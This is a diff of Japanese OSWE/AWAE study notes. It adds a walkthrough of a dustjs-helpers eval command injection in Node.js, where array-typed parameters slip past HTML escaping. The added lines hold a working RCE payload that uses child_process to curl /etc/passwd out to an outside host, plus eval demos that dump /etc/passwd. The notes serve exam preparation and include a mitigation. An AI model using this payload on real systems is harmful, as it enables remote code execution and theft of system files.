@@ -4,9 +4,7 @@
 
 - [AWAE-preparation](#awae-preparation)
 - [Vuln](#vuln)
-  - [sample](#sample)
-  - [Command Injection](#command-injection)
-    - [dustjs-helper (Node.js)](#dustjs-helper-nodejs)
+- [test](#test)
   - [Information leak](#information-leak)
     - [new Buffer(100); (Node.js)](#new-buffer100-nodejs)
 - [メモ](#%E3%83%A1%E3%83%A2)
@@ -41,12 +39,37 @@ https://github.com/linkedin/dustjs-helpers/blob/03cd65f51a/lib/dust-helpers.js
 if helperの挙動を確認するために、dustjsのgithubの**wiki**の**Dust tutorial**を読む。   
 https://github.com/linkedin/dustjs/wiki/Dust-Tutorial#if_condcondition__if_helper_Removed_in_160_release   
 見た感じ条件式をevalの中に入れてるっぽいらしい。   
-つまり、`\`を入れると、`eval('desktop\' === 'desktop')`となってSyntaxErrorとなる。   
+つまり、`\`を入れると、`eval("'desktop\' === 'desktop'")`となってSyntaxErrorとなる。   
 ![image](https://user-images.githubusercontent.com/56021519/101359923-423c2600-38e0-11eb-875c-ce9b66c0bf69.png)   
 任意のコマンドを実行するには`\`以外にも`'`とかも使う必要がある。ので、htmlEscapeする箇所を探して、そこら辺を探す。   
+`escape`,`html`とかのキーワードで探すとよさそう？？   
+https://github.com/linkedin/dustjs/blob/master/dist/dust-core.js   
+どうやら`String`型の時しかEscapeされてないらしい。   
+![image](https://user-images.githubusercontent.com/56021519/101360732-69dfbe00-38e1-11eb-9cfd-e98794fedb98.png)   
+`?device=desktop`みたいにパラメータを渡す代わりに、`?device[]=1&device[]=2`みたいにして`Array`型でパラメータを渡せばEscapeされずにそのままevalまでたどり着きそう！   
+Array型いきなり渡してもいいんだ…！？ふーん。   
+`?device[]=x&device[]=y'-require('child_process').exec('curl+-F+"x=`cat+/etc/passwd`"+artsploit.com')-'`   
+とするとRCEできるらしい！！！   
+これは以下のようになるから。   
+```js
+// 元はこれ
+eval("  ''  == 'desktop'  ")
 
+// 上にPayloadを挿入するとこうなる。-は文字列の引き算？
+> eval("  'y'-require('child_process').exec('cat /etc/passwd > ../nodejs/output')-''  == 'desktop'  "); 
+false
+
+// +でも-でもどっちでもよさそう
+> eval("  'y'+require('child_process').exec('cat /etc/passwd > ../nodejs/output')+''  == 'desktop'  "); 
+false
+> 
+```
 - 対策   
+evalの入力検証を実装する。htmlEscapeはString型だけじゃなくてすべての型で行う。   
 - 参考資料   
+https://artsploit.blogspot.com/2016/08/pprce2.html   
+https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/   
+
 ## Information leak
 ### new Buffer(100); (Node.js)
 - 概要   
